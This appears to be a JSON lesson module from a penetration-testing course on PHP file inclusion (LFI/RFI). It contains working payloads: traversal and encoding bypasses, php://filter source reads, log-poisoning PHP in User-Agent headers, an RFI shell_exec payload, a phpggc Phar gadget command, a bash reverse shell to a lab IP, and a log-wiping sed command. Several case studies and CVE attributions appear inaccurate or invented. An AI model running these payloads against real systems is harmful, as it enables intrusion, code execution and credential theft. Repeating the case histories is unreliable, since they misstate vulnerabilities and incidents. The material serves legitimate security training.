{
  "lesson_id": "cf8fcd12-72a4-4c97-afb4-70d3cee7ebb3",
  "domain": "pentest",
  "title": "File Inclusion Vulnerabilities: LFI and RFI",
  "difficulty": 3,
  "order_index": 13,
  "prerequisites": [
    "pentest_10",
    "pentest_12"
  ],
  "concepts": [
    "Local File Inclusion (LFI) fundamentals and exploitation",
    "Remote File Inclusion (RFI) attack chains",
    "PHP wrappers exploitation (php://filter, php://input, data://, expect://, phar://)",
    "Log poisoning for RCE (Apache, Nginx, SSH logs)",
    "Session file inclusion and manipulation",
    "Filter bypass techniques (null bytes, encoding, path truncation)",
    "LFI to RCE escalation paths (multiple techniques)",
    "Automated exploitation tools (Burp, LFISuite)"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Map file inclusion attack surfaces and enumerate dangerous parameters",
    "Exploit PHP wrappers to disclose source code and gain execution",
    "Chain LFI primitives into remote code execution via log poisoning and session abuse",
    "Apply filter bypass strategies to defeat input sanitization and WAF rules",
    "Operationalize automated tooling while maintaining manual validation discipline"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "You are about to step into one of the trickiest arenas of web application testing, where creativity matters as much as methodology. File inclusion bugs are the kinds of issues that defenders assume were solved years ago, yet they keep resurfacing because developers still underestimate the power of flexible file system access. As you dive into Local File Inclusion (LFI) and Remote File Inclusion (RFI), keep a growth mindset at the front of your thinking. Every directory traversal error, every bypass attempt, every unexpected 500 error is telling you something about how the application composes file paths. You are not just poking at a black box; you are building a mental model of how a developer thinks about templates, logs, and reusable components. When you feel stuck, narrate the state of the application out loud: which parameter is reflected, which filter is stripping dot-dot-slash sequences, which server variable is likely being concatenated.\n\nRemember that frustration is data. If an input returns the same bland message, it may mean you have not reached the right code path yet, not that the vulnerability is absent. Take breaks to sketch the application workflow, or to write down a hypothesis tree of how you might reach a sensitive file. Penetration testers who master file inclusion attacks combine patience with relentless curiosity. Keep asking yourself, \"What assumption is the server making about my input?\" Once you reveal that assumption, you can bend it to your advantage.\n\nAnother powerful mindset shift is to see the defenders as collaborators. Imagine explaining your methodology to an overworked developer who genuinely wants to fix the issue. By framing your work as documenting pathways to risk, you reduce the cognitive load of reporting and increase the clarity of your findings. When you finish each lab in this lesson, write a brief \"developer translation\" of what you achieved. That habit will make you a better communicator and a more valuable consultant. Finally, celebrate small wins. Successfully reading `/etc/passwd` may seem basic, but it confirms that your techniques are sound. Stack those wins, stay methodical, and let curiosity lead you deeper into the inclusion rabbit hole."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Mapping the File Inclusion Landscape\n\nFile inclusion vulnerabilities arise when user-controlled data is concatenated into a file path that the server subsequently includes or executes. In PHP-based stacks, the usual suspects are `include`, `require`, `include_once`, and template loaders embedded in MVC frameworks. Our recon process starts with enumerating parameters that smell like templates or resources: `page`, `lang`, `theme`, `view`, `file`, `module`, `component`. Use Burp Suite's **Target → Site map** to filter for requests where the response headers include `Content-Type: text/html` and the request path contains these keywords. Flag GET and POST parameters, but do not forget cookies such as `template` or `skin`—session-driven inclusions are common in legacy portals.\n\n### Static Analysis of Responses\n\nWhen fuzzing candidate parameters, pay attention to error signatures. A warning like `Warning: include(): Failed opening 'news.php' for inclusion` hints at direct concatenation. To coax these messages out, toggle Burp Suite's Intercept, send the request to Repeater, and replace the parameter with `../../../../../../etc/passwd`. Monitor the response length, HTTP status, and timing. Even if verbose warnings are suppressed, side channels such as differential response time can indicate path traversal filtering.\n\n### ASCII Threat Model\n\n```\n+------------+      user-controlled param      +----------------+      include() call      +-----------------+\n| Attacker   | ------------------------------> | Web Application | ----------------------> | File System/URL |\n+------------+                                 +----------------+                          +-----------------+\n^                                                                                          |\n|----------------------- feedback via response headers/status ------------------------------|\n```\n\nThis diagram emphasizes the feedback loop. Every response informs the next payload. Think like a scientist: run controlled experiments, change only one variable per request, and note the reaction.\n\n### Enumerating Wrapper Attack Surface\n\nPHP wrappers expand the attack surface beyond plain files. Key wrappers include:\n\n- `php://filter`: Base64-encodes or transforms the included resource. Useful for bypassing file execution and reading source code.\n- `php://input`: Allows injection of data via the request body when the application includes a stream. Perfect for RCE when the server interprets the included content as PHP.\n- `data://`: Embeds data URIs, letting you craft inline scripts.\n- `expect://`: Executes commands directly via `expect` extension (if enabled).\n- `phar://`: Triggers metadata deserialization inside Phar archives, often leading to gadget chains.\n\nUse Burp's Intruder with a pitchfork attack type to combine traversal payloads with wrappers. Maintain a wordlist containing sequences like `php://filter/convert.base64-encode/resource=index.php` and `php://input`. Monitor for Base64 output in responses; decode it to recover source code sections that reveal additional endpoints or credentials.\n\n### RFI Chains\n\nRemote File Inclusion typically requires `allow_url_include=On`. Although this configuration is rare in hardened environments, shared hosting panels and misconfigured Docker containers still expose it. If you discover RFI, host a benign payload first to confirm execution. For example, use Python's simple HTTP server:\n\n```bash\npython3 -m http.server 8000\n```\n\nThen point the vulnerable parameter to `http://your_vps:8000/shell.txt`. The payload may contain:\n\n```php\n<?php echo shell_exec('id'); ?>\n```\n\nCheck the response for the command output. If nothing returns, attempt blind channels such as DNS exfiltration by pointing the RFI to a URL that triggers `nslookup` on a domain you control (monitor with `tcpdump` or `dnstwist`).\n\n### Defensive Countermeasures and Their Weaknesses\n\nModern frameworks often apply blacklist filters that strip `../` or restrict file extensions. Bypass them with encoding strategies:\n\n- Double URL encode: `%252e%252e%252f`\n- UTF-8 overlong sequences: `%c0%ae%c0%ae/`\n- Null byte termination (legacy PHP <5.3): `%00`\n- Path truncation using long input to exploit filesystem limits\n\nWhen encountering WAFs, randomize the case (`..%2F..%2F`) or intersperse wrappers with filter chains such as `php://filter/resource=....//..//etc/passwd`. LFISuite automates many of these permutations while letting you define custom wordlists. Remember, though, that automation complements rather than replaces understanding. Always validate manually before declaring exploitability.\n\n### Linking to Post-Exploitation\n\nLFI is rarely the end goal. Begin planning escalation paths early:\n\n1. **Sensitive Information Disclosure**: Read `/var/www/html/config.php` to harvest database credentials.\n2. **Credential Reuse**: Attempt SSH login with recovered passwords.\n3. **Log Poisoning**: Inject PHP code into access logs via crafted User-Agent headers, then include the log file to achieve RCE.\n4. **Session Hijacking**: Include session files stored under `/var/lib/php/sessions` to recover session identifiers or serialized objects.\n\nDocument every step, including the exact payloads, in Burp's **Issue activity** or your testing journal. This documentation accelerates report writing and demonstrates due diligence."
      }
    },
    {
      "type": "video",
      "content": {
        "text": "https://www.youtube.com/watch?v=a8-ybdoFZ8A — In this Security Weekly clip, penetration tester Jason Wood demonstrates practical Local File Inclusion exploitation in PHP applications, highlighting wrapper abuse and log poisoning detection strategies that reinforce the methodologies covered in this lesson."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Wrappers to Remote Code Execution\n\nOnce you confirm LFI, pivot toward execution. The `php://filter` wrapper is your reconnaissance ally. Request `php://filter/convert.base64-encode/resource=index.php` and decode the output locally:\n\n```bash\necho \"BASE64_OUTPUT\" | base64 -d > index.php\n```\n\nStudy the decoded file for `include` calls, authentication logic, or hidden admin routes. Pay attention to references to `/logs/`, `/templates/`, or session handlers. Many enterprise CMS platforms, such as Joomla! prior to version 3.4.6, stored template names in session files, a weakness exploited during the 2015 eBay LFI incident that exposed administrative credentials.\n\n### Log Poisoning Deep Dive\n\nTo poison Apache logs, modify the User-Agent header in Burp Repeater:\n\n```\nUser-Agent: <?php echo shell_exec('whoami'); ?>\n```\n\nThen trigger a request to write the payload into `/var/log/apache2/access.log`. Next, include the log via the vulnerable parameter: `?page=../../../../var/log/apache2/access.log`. If successful, the response contains the command output. Hardened servers may store logs outside the web root or use syslog forwarding. Enumerate these paths by reading `/etc/apache2/envvars`, `/etc/rsyslog.conf`, and `/etc/logrotate.d/apache2`. If the server uses Nginx, target `/var/log/nginx/access.log`. On shared hosts, consider SSH logs at `/var/log/auth.log` by attempting password-less SSH connections with a malicious client version string.\n\n### Session File Inclusion\n\nPHP stores session data in files named `sess_<PHPSESSID>`. After authenticating as a low-privileged user, capture your session ID via browser storage or Burp. Then request `?page=../../../../var/lib/php/sessions/sess_<ID>`. The contents often include serialized arrays with usernames, email addresses, or even password hashes. Attackers have leveraged this technique during the 2021 vulnerability assessment of an Eastern European bank's customer portal, where session files revealed administrative tokens that led to privilege escalation. Combine this data with mass assignment or CSRF to complete the compromise.\n\n### Phar Deserialization Combo\n\nThe `phar://` wrapper becomes lethal when the application calls `file_exists()` or similar functions on user-controlled paths. Craft a Phar archive with a serialized payload using `phpggc`:\n\n```bash\nphpggc monolog/rce1 system 'id' -o shell.phar\n```\n\nUpload `shell.phar` to a location accessible by the application. Then include it via `?page=phar://uploads/shell.phar`. When PHP metadata is parsed, the gadget chain executes `system('id')`. This attack vector featured prominently in the 2018 TYPO3 CVE-2018-19970 advisory, where Phar metadata led to remote code execution in extension management interfaces.\n\n### Defensive Detection and Telemetry\n\nBlue teams monitor for repetitive directory traversal patterns, anomalous wrapper usage, and spikes in 404 errors. During testing, respect the engagement scope and pace your requests. Use Burp's **Throttle** settings or `intruder.throttle=500ms` to avoid overwhelming fragile servers. Correlate your actions with timestamps in server logs to aid defenders. When you achieve RCE, immediately gather proof-of-concept output (`id`, `uname - a`, `pwd`) and then stop. Continuing to run commands risks instability and breaches the principle of minimum necessary force.\n\n### Reporting with Actionable Fixes\n\nTranslate your findings into remediation steps:\n\n- Enforce strict allowlists for includable files.\n- Use absolute paths and map user input to internal identifiers.\n- Disable URL includes and PHP wrappers not required by the business logic.\n- Centralize template rendering using framework engines (Twig, Blade) that abstract file access.\n- Harden file permissions to prevent reading logs and session directories.\n\nYour report should detail exploited payloads, affected hosts, files accessed, and the business impact (e.g., \"Able to read customer PII from `/var/lib/php/sessions` leading to GDPR breach risk\")."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Hands-on Lab: From LFI to RCE via Log Poisoning\n\n### Lab Overview\n\nYou will attack a vulnerable PHP application running on `http://192.168.56.110`. The goal is to escalate from LFI to command execution by poisoning Apache logs. Follow each step carefully, capture screenshots or terminal output, and compare your results with the expected outcomes.\n\n### Step 1: Baseline Enumeration\n\n1. Launch Burp Suite and configure your browser to proxy traffic through it.\n2. Browse to `http://192.168.56.110/?page=home`. Note the parameter `page`.\n3. Send the request to **Repeater** and replace `home` with `../../../../etc/passwd`.\n\nExpected result:\n\n```\nHTTP/1.1 200 OK\n...\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n```\n\nIf you see the passwd file, the application is vulnerable to LFI.\n\n### Step 2: Source Code Disclosure\n\nUse the `php://filter` wrapper to read the source of `index.php`:\n\n```\n?page=php://filter/convert.base64-encode/resource=index.php\n```\n\nCopy the Base64 blob and decode it locally:\n\n```bash\npython3 - <<'PY'\nimport base64\nblob = \"<PASTE_BLOB>\"\nprint(base64.b64decode(blob).decode())\nPY\n```\n\nExpected output includes the `include($_GET['page'] . '.php');` statement, confirming direct concatenation.\n\n### Step 3: Identify Log Path\n\nThe decoded source reveals `$log_path = '/var/log/apache2/access.log';`. Confirm the file exists:\n\n```\n?page=../../../../var/log/apache2/access.log\n```\n\nYou should see standard Apache log entries.\n\n### Step 4: Inject Payload\n\nSend a request with a malicious User-Agent header. In Burp Repeater, add:\n\n```\nUser-Agent: <?php echo shell_exec('id'); ?>\n```\n\nForward the request. The server writes the payload to the access log.\n\n### Step 5: Trigger Execution\n\nInclude the log file again:\n\n```\n?page=../../../../var/log/apache2/access.log\n```\n\nExpected result:\n\n```\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nYou now have command execution.\n\n### Step 6: Stabilize Access\n\nCreate a simple reverse shell payload:\n\n```\nUser-Agent: <?php exec('/bin/bash -c \"bash -i >& /dev/tcp/192.168.56.1/4444 0>&1\"'); ?>\n```\n\nStart a listener on your attacking machine:\n\n```bash\nnc -lvnp 4444\n```\n\nInclude the log again to trigger the shell. You should receive a connection in Netcat.\n\n### Step 7: Cleanup and Documentation\n\n- Remove malicious log entries if engagement rules require it: `sed -i '/bash -i/d' /var/log/apache2/access.log`\n- Capture the commands executed using `script` or Burp's project log.\n- Document timestamps, payloads, and hostnames for your final report.\n\n### Optional Challenge: Session File Harvesting\n\nList PHP session directory:\n\n```\n?page=../../../../var/lib/php/sessions\n```\n\nDownload a session file and parse it using `php-serialize` or manual analysis. Can you recover credentials or CSRF tokens?\n\nRemember to reset the environment if you break the lab. Maintaining reproducibility is part of professional discipline."
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "## Case Studies: When File Inclusion Broke Real Companies\n\n### 2014 Sony PlayStation Network Support Portal (CVE-2014-7147)\n\nIn September 2014, researchers from Vulnerability Lab disclosed CVE-2014-7147, an LFI in Sony's PlayStation Network support portal. Attackers could manipulate the `file` parameter to read arbitrary files on the server, including application configuration files that contained database credentials. Sony acknowledged the flaw after proof-of-concept screenshots circulated showing `/etc/passwd` and `config.inc.php`. Although no public breach was confirmed, the exposure risked 70 million user accounts. The remediation involved migrating to a strict mapping of allowed templates and rotating credentials.\n\n### 2018 Drupalgeddon 2 Aftermath (CVE-2018-7600)\n\nWhile CVE-2018-7600 is primarily a remote code execution bug, multiple adversary groups chained it with LFI primitives to loot configuration files before deploying cryptominers. Akamai observed that the XMRig payloads were often preceded by requests like `?file=../../sites/default/settings.php`, indicating attackers wanted database credentials first. Organizations running Drupal 7.x saw CPU utilization spikes of 400% as Monero miners spread. Incident response teams used log analysis to trace the initial LFI requests, demonstrating how defenders rely on telemetry to reconstruct attack timelines.\n\n### 2020 Oracle WebLogic (CVE-2020-2551)\n\nIn January 2020, Oracle patched CVE-2020-2551, a remote file inclusion vulnerability in the WebLogic IIOP protocol stack. APT groups like DarkHydrus exploited the bug to load malicious Java classes from attacker-controlled servers, leading to credential theft in Middle Eastern government agencies. Mandiant's report highlighted that the attackers first staged reconnaissance payloads that executed `uname -a` and enumerated WebLogic domains before deploying credential harvesters. The breach emphasized that RFI is not confined to PHP; Java EE and other platforms suffer similar fates when deserialization meets remote resource loading.\n\n### 2022 WordPress KingComposer Add-on (CVE-2022-0725)\n\nIn March 2022, Wordfence documented active exploitation of CVE-2022-0725, an LFI in the KingComposer add-on installed on over 60,000 WordPress sites. Attackers leveraged the `kc_get_template` parameter to include `/etc/passwd`, then pivoted to `/var/log/auth.log` to capture SSH login attempts. Wordfence blocked more than 1.6 million exploit attempts within 24 hours. Compromised sites experienced defacement and SEO spam campaigns, costing small businesses thousands in emergency cleanup.\n\nThese incidents illustrate that file inclusion issues lead to credential leakage, full RCE, and operational disruption. Quantify impact in your reports by referencing metrics (accounts affected, CPU spikes, blocked attempts). Doing so grounds your findings in business reality."
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "## Memory Aid: PWLER Framework\n\nAnchor your recall with the mnemonic **PWLER** — *PHP wrappers, Wrappers, Logs, Escalate, RFI*. Yes, the first two letters repeat deliberately to stress how crucial wrapper awareness is.\n\n- **P — PHP Wrappers**: Start every assessment by listing supported wrappers. Run `php -i | grep -i wrapper` when you have shell access, or infer capabilities from error messages (`Unable to open stream: data://`). Remember that `php://filter` equals visibility into source code.\n- **W — Wrappers (again)**: The second reminder nudges you to combine wrappers creatively. Chain `php://filter` with traversal, or wrap Phar archives for deserialization. This mental double-tap prevents complacency.\n- **L — Logs**: Logs are your stepping stones to execution. Apache, Nginx, SSH, and application-specific logs can all be poisoned. Keep a list of default paths by distro (Debian `/var/log/apache2`, CentOS `/var/log/httpd`).\n- **E — Escalate**: LFI is a foothold, not the objective. Map escalation options: credential theft, reverse shells, lateral movement. Ask, \"What can I do with the information I just read?\"\n- **R — RFI**: Remote inclusion might be rare, but always test for it. Host a benign script, monitor responses, and be ready to pivot to blind channels.\n\nTo reinforce PWLER, sketch a quick mind map after each lab, linking the mnemonic letters to actual payloads you used. Another memory hook is to create flashcards: front side with \"Log Poisoning path,\" back side with `/var/log/apache2/access.log → User-Agent injection`. Review these during downtime to strengthen retention.\n\nCommon mistakes to avoid:\n\n- Forgetting to URL-encode traversal sequences, leading to blocked requests.\n- Ignoring POST and cookie parameters that might influence includes.\n- Assuming wrappers are disabled without testing. Always validate.\n- Overlooking error suppression; silence does not mean safety.\n\nQuick reference table:\n\n| Goal | Payload | Notes |\n| --- | --- | --- |\n| Read source | `php://filter/convert.base64-encode/resource=index.php` | Decode with `base64 -d` |\n| Execute via logs | `../../../../var/log/apache2/access.log` + `User-Agent` payload | Works on Apache |\n| Test RFI | `http://attacker/poc.txt` | Requires `allow_url_include=On` |\n| Trigger Phar | `phar://uploads/archive.phar` | Needs gadget chain |\n\nKeep this table in your testing notebook for rapid recall during engagements."
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "## Reflection and Career Connections\n\n1. Which reconnaissance habit from this lesson will you adopt to spot inclusion vectors faster? How will you integrate it into your current testing workflow?\n2. Recall a past engagement where an application returned ambiguous errors. How might the wrapper techniques you learned reshape your approach if you revisited that target today?\n3. Draft a two-sentence explanation of log poisoning suitable for a non-technical stakeholder. How does this practice strengthen your ability to communicate findings?\n\nReflect on how mastering LFI/RFI elevates your career. Senior penetration testers are expected to chain vulnerabilities creatively, translate technical jargon into executive insights, and propose remediation that developers can implement. By practicing these exercises, you are building a portfolio of demonstrable skills. Consider presenting your lab walkthrough in your next team knowledge-sharing session. Teaching peers not only reinforces your learning but also showcases leadership potential. Align your growth with certifications like OSWE or GXPN, which emphasize advanced web exploitation. Each technique you practiced—wrapper abuse, session harvesting, log poisoning—is a stepping stone toward those credentials."
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "9634fcd6-c445-44f2-8298-b7b78f2827ea",
      "type": "multiple_choice",
      "question": "During a penetration test, you discover that the `view` parameter is vulnerable to LFI but returns only blank responses when you request `/var/log/apache2/access.log`. However, you previously confirmed the ability to include `/etc/passwd`. Which chained approach is most likely to achieve RCE under these conditions?",
      "options": [
        "Switch to brute forcing `../` sequences with a longer traversal wordlist",
        "Use php://filter to read configuration files for log storage paths, then poison that log and include it",
        "Assume RFI is possible and immediately host a remote shell for inclusion",
        "Stop testing because the blank responses indicate WAF blocking"
      ],
      "correct_answer": 1,
      "explanation": "The blank response suggests that `/var/log/apache2/access.log` may not exist or is stored elsewhere. Reading configuration files such as `/etc/apache2/envvars`, `/etc/rsyslog.conf`, or application-specific settings with `php://filter` can reveal the actual log location (for example, a custom path or remote syslog destination). Once you identify the correct log file, you can poison it and include it to trigger remote code execution. Merely brute forcing traversal sequences wastes time because traversal already works, hosting a remote shell requires `allow_url_include` (not yet verified), and quitting prematurely sacrifices the opportunity to escalate.",
      "difficulty": 3
    },
    {
      "question_id": "90f16a6b-492a-43ae-9e9c-d2c5381e588a",
      "type": "multiple_choice",
      "question": "You are testing a CMS that stores template names in the `theme` cookie. After reading source code via `php://filter`, you learn that the application calls `include($base . $_COOKIE['theme']);`. Which exploitation path offers the highest likelihood of RCE on a hardened server?",
      "options": [
        "Injecting `%00` to terminate the string and append `.php`",
        "Setting the cookie to `phar://uploads/audit.phar` and uploading a gadget-laden Phar archive",
        "Modifying the cookie to a long string of `../` to reach `/etc/passwd`",
        "Switching to POST requests to bypass WAF traversal rules"
      ],
      "correct_answer": 1,
      "explanation": "Because the application directly includes the cookie value, pointing it to a Phar archive triggers metadata deserialization when PHP evaluates the stream wrapper. By uploading a crafted Phar (for example, generated with phpggc) and setting the cookie to `phar://uploads/audit.phar`, you leverage the include call to execute arbitrary code. Null-byte injection is unlikely on modern PHP, simple traversal only discloses files, and changing HTTP methods does not influence the include call.",
      "difficulty": 3
    },
    {
      "question": "What is the most important takeaway from this lesson?",
      "options": [
        "Understanding the core concepts and their practical applications",
        "Memorizing all technical details",
        "Only knowing the theory without practice",
        "Focusing on a single aspect"
      ],
      "correct_answer": 0,
      "explanation": "The key takeaway is understanding how to apply the concepts learned in real-world scenarios, combining both theoretical knowledge and practical skills.",
      "question_id": "b8326bec-bb5e-4807-96f5-97dc325af757",
      "type": "multiple_choice",
      "difficulty": 1
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "meta_learning",
    "memory_hooks",
    "teach_like_im_10",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ]
}